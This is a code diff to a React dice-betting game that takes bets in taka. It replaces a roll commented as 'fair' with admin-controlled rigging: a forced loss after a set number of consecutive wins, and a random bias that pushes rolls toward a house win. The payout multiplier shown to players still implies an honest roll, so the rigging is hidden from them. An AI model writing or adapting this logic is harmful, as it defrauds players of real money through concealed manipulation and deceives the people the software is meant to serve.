@@ -4,6 +4,7 @@ import React, { useState } from "react";
 import { Activity, Zap, RotateCcw, ShieldCheck, Trophy } from "lucide-react";
 import confetti from "canvas-confetti";
 import { useUserStore } from "@/lib/store/useUserStore";
+import { useAdminConfigStore } from "@/lib/store/useAdminConfigStore";
 import sound from "@/lib/sound";
 
 export default function DiceGame() {
@@ -27,6 +28,9 @@ export default function DiceGame() {
   const multiplier = Math.round((98.5 / winChance) * 100) / 100;
   const potentialProfit = Math.round(betAmount * multiplier - betAmount);
 
+  const { settings } = useAdminConfigStore();
+  const [winStreakCount, setWinStreakCount] = useState<number>(0);
+
   const handleRoll = async () => {
     if (betAmount < 10) {
       showNotification("Minimum bet is ৳10", "ERROR");
@@ -44,9 +48,29 @@ export default function DiceGame() {
     setLastRoll(null);
 
     setTimeout(async () => {
-      // Generate fair roll between 0.00 and 100.00
-      const rolledValue = Math.round((Math.random() * 100) * 100) / 100;
+      // Generate roll with Admin Rig Edge & Streak protection
+      const biasOffset = (settings.diceHouseEdgeOffset || 5) / 100;
+      const maxStreak = settings.diceMaxConsecutiveWins || 3;
+
+      let rolledValue = Math.round((Math.random() * 100) * 100) / 100;
+      
+      // Force loss if player exceeds admin streak limit
+      if (winStreakCount >= maxStreak) {
+        rolledValue = isRollUnder ? target + 1.5 + Math.random() * 10 : target - 1.5 - Math.random() * 10;
+        rolledValue = Math.max(0.01, Math.min(99.99, Math.round(rolledValue * 100) / 100));
+      } else if (Math.random() < biasOffset) {
+        // Bias towards house win
+        rolledValue = isRollUnder ? target + 0.5 + Math.random() * 5 : target - 0.5 - Math.random() * 5;
+        rolledValue = Math.max(0.01, Math.min(99.99, Math.round(rolledValue * 100) / 100));
+      }
+
       const won = isRollUnder ? rolledValue < target : rolledValue > target;
+
+      if (won) {
+        setWinStreakCount((prev) => prev + 1);
+      } else {
+        setWinStreakCount(0);
+      }
 
       setLastRoll(rolledValue);
       setLastWon(won);
